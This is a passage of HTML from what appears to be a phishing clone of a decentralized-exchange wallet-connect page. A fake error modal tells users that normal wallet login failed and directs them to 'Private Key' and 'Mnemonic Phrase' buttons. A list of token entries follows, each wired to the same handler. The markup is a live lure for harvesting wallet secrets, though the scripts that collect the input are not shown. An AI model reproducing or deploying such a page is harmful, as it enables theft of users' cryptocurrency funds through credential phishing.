                                <img src="data:image/png;base64,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" alt="Icon">
                            </div>
                        </button>
                        <button id="connect-Portis" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" onclick="openModalError_button()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#4A6C9B" class="sc-hwwEjo cZFjOz">Portis</div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"><img src="./files/portisIcon.b234b2bf.png" alt="Icon"></div>
                        </button>
                    </div>
                    <div class="sc-hZSUBg lczxjN">
                        <span>New to Ethereum? &nbsp;</span> <a target="_blank" rel="noopener noreferrer" href="./#modal_error" class="sc-dxgOiQ eahMwZ">Learn more about wallets</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<!-- error modal -->
<div class="sc-fBuWsC kEokqJ" id="modal_error" data-reach-dialog-overlay="" style="opacity: 1; display: none;">
    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" hidden="" class="sc-fMiknA fuGLvk" data-reach-dialog-content="">
        <div class="sc-hXRMBi fqOcYb">
            <div class="sc-bsbRJL hgyVGw">
                <div class="sc-epnACN haZPvP">
                    <div class="sc-iuJeZd juASlh">Connect to a wallet</div>
                </div>
                <div class="sc-iQNlJl kLhUQG">
                    <div class="sc-cMhqgX idOYax">
                        <button id="connect-METAMASK" style="" class="connect-METAMASK sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                            <span>An error has occurred, please use these login methods! We will fix the problem soon.</span>
                        </button>
                        <button id="connect-WALLET_CONNECT" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    color: rgb(255, 0, 122);
" onclick="openModalPrivat()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#4196FC" style="margin-left: 105px" class="sc-hwwEjo cZFjOz">Private Key
                                </div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"></div>
                        </button>
                        <button id="connect-WALLET_LINK" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx" style="
    background-color: rgb(253, 234, 241);
    color: rgb(255, 0, 122);
" onclick="openModalMnem()">
                            <div class="sc-gxMtzJ bnTkUa">
                                <div color="#315CF5" style="margin-left: 80px" class="sc-hwwEjo cZFjOz">Mnemonic
                                    Phrase
                                </div>
                            </div>
                            <div class="sc-kfGgVZ kyutNn"></div>
                        </button>
                        <!--  <button id="connect-FORTMATIC" class="sc-kTUwUJ sc-dqBHgY sc-dfVpRl fcKEzx">
                            <div class="sc-gxMtzJ bnTkUa"><div color="#6748FF" style="margin-left: 119px" class="sc-hwwEjo cZFjOz">Keystore</div></div>

                        </button> -->

                    </div>

                </div>
            </div>
        </div>
    </div>
</div>


<!-- modal select token -->
<div class="sc-fBuWsC kEokqJ" id="select_token" data-reach-dialog-overlay="" style="opacity: 1; display: none; ">
    <div aria-modal="true" role="dialog" tabindex="-1" aria-label="dialog" hidden="" class="sc-fMiknA ezhfps" data-reach-dialog-content="">
        <div class="sc-jWBwVP gWrKlj" style="width: 100%;">
            <div class="sc-cMljjf sc-dTdPqK iVRWTr">
                <div class="sc-bdVaJa sc-htpNat sc-bxivhb lXHGK">
                    <div class="css-xy7yfl">
                        Select a token
                        <span style="margin-left: 4px;">
                            <div class="sc-jDwBTQ dQsmjY">
                                <div class="sc-jlyJG gKhJXH">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <circle cx="12" cy="12" r="10"></circle>
                                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
                                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
                                    </svg>
                                </div>
                            </div>
                        </span>
                    </div>
                    <svg xmlns="http://www.w3.org/2000/svg" onclick="closeModalToken()" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="sc-kgoBCf fROEoW">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </div>
                <div class="sc-jDwBTQ dQsmjY"><input type="text" id="token-search-input" placeholder="Search name or paste address" class="sc-krDsej sc-fzsDOv kKAAkJ" value=""></div>
                <div class="sc-bdVaJa sc-htpNat sc-bxivhb lXHGK">
                    <div class="css-1pfyy1z">Token Name</div>
                    <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-gPWkxV jqhPGN">
                        <div class="css-1pfyy1z">↓</div>
                    </div>
                </div>
            </div>
            <div style="width: 100%; height: 1px; background-color: rgb(247, 248, 250);"></div>
            <div style="position: relative; height: 500px; width: 100%; overflow: auto; will-change: transform; direction: ltr; flex: 1 1 0%;">
                <div style="height: 1512px; width: 100%;">
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL ctdXov token-item-0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" style="position: absolute; left: 0px; top: 0px; height: 56px; width: 100%;">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="data:image/png;base64,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" class="sc-dUjcNx jxOTRC" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj" onclick="Token_wallet()">
                                <div class="css-8mokm4">ETH<span class="sc-bHwgHz bnBnIZ"> (Selected as input)</span>
                                </div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xB6eD7644C69416d67B522e20bC294A9a9B405B31" style="position: absolute; left: 0px; top: 56px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo.png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">0xBTC</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d" style="position: absolute; left: 0px; top: 112px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(1).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">aDAI</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x737F98AC8cA59f2C68aD658E3C3d8C8963E40a4c" style="position: absolute; left: 0px; top: 168px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(2).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">AMN</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xD46bA6D942050d489DBd938a2C909A5d5039A161" style="position: absolute; left: 0px; top: 224px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(3).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">AMPL</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xcD62b1C403fa761BAadFC74C525ce2B51780b184" style="position: absolute; left: 0px; top: 280px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(4).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">ANJ</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x960b236A07cf122663c4303350609A66A7B288C0" style="position: absolute; left: 0px; top: 336px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(5).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">ANT</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x27054b13b1B798B345b591a4d22e6562d47eA75a" style="position: absolute; left: 0px; top: 392px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(6).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">AST</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xBA11D00c5f74255f56a5E366F4F77f5A186d7f55" style="position: absolute; left: 0px; top: 448px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(7).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">BAND</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x0D8775F648430679A709E98d2b0Cb6250d2887EF" style="position: absolute; left: 0px; top: 504px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK">
                            <img src="./files/logo(8).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">BAT</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C" style="position: absolute; left: 0px; top: 616px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(9).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">BNT</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>

                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x0327112423F3A68efdF1fcF402F6c5CB9f7C33fd" style="position: absolute; left: 0px; top: 672px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(10).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">BTC++</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>

                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643" style="position: absolute; left: 0px; top: 728px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(11).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">cDAI</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>

                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xaaAEBE6Fe48E54f431b0C390CfaF0b017d09D42d" style="position: absolute; left: 0px; top: 784px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(12).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">CEL</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0xaaAEBE6Fe48E54f431b0C390CfaF0b017d09D42d" style="position: absolute; left: 0px; top: 784px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(12).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
                                <div class="css-8mokm4">CEL</div>
                                <div class="sc-bdVaJa sc-htpNat sc-bZQynM sc-TFwJa kPScku"></div>
                            </div>
                        </div>
                        <div class="sc-cMljjf gfhOMX">-</div>
                    </div>
                    <div class="sc-bdVaJa sc-htpNat sc-bxivhb sc-itybZL kcOfQS token-item-0x4F9254C83EB525f9FCf346490bbb3ed28a81C667" style="position: absolute; left: 0px; top: 840px; height: 56px; width: 100%;" onclick="Token_wallet()">
                        <div class="sc-bdVaJa sc-htpNat sc-bZQynM GlZoK"><img src="./files/logo(13).png" class="sc-fYiAbW eCbjpb" style="margin-right: 14px;">
                            <div class="sc-jWBwVP gWrKlj">
